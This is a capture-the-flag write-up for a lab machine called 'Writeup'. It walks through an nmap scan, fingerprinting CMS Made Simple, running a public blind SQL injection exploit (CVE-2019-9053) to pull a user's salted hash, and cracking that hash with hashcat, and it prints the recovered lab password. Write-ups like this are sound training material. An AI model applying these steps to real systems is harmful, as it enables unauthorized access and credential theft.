# Writeup

# Enumeration
---
### Nmap
#

Run a tcp syn nmap scan against the target, checking versions and running default scripts on all ports. 
```bash
# Nmap 7.94SVN scan initiated Wed Dec 11 06:50:13 2024 as: nmap -v -sS -sV -sC -T4 -p- -oA nmap-full-tcp-writeup 10.129.229.158
Nmap scan report for 10.129.229.158
Host is up (0.035s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE    VERSION
22/tcp open  ssh        OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 11 06:52:00 2024 -- 1 IP address (1 host up) scanned in 107.09 seconds

```

### HTTP
#

Retro style website on port 80 talking about DDoS protection

![image](https://github.com/user-attachments/assets/c86b97da-7c2b-4045-93a4-6e59e4965a39)

Visiting key pages such as robots.txt gave the following directory in the Disallow list: /writeup/

![image](https://github.com/user-attachments/assets/8ac080cd-bab5-417d-b1ad-0dae52a77827)

The source code shows this is running [CMS Made Simple](https://www.cmsmadesimple.org/), an open source Content Management System, the copyright gives us a clue this version is from 2019. 

```html
<base href="http://10.129.229.158/writeup/" />
<meta name="Generator" content="CMS Made Simple - Copyright (C) 2004-2019. All rights reserved." />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
```

Browsing Google for vulnerabilities in CMS made simple shows [CVE-2019-9053](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9053) from 2019. This is a blind SQL vulnerability with a [public exploit](https://www.exploit-db.com/exploits/46635).  

Download the script and make the very basic alterations to get it working. Running the script finds the following information:

```bash
[+] Salt for password found: 1
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
```

The password looks like an MD5 hash which hashid all but confirms by returning MD2, MD5 and MD4 as the top 3 likely hash algorithms. 

```bash
hashid 62def4866937f08cc13bab43bb14e6f7

Analyzing '62def4866937f08cc13bab43bb14e6f7'
[+] MD2 
[+] MD5 
[+] MD4 
```

Running the hash through hachcat crack it and gives us the users password

```bash
hash
hashcat -a 0 -m 20 hash /usr/share/wordlists/rockyou.txt

<--snip-->

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9

<--snip-->
```

Password : raykayjay9
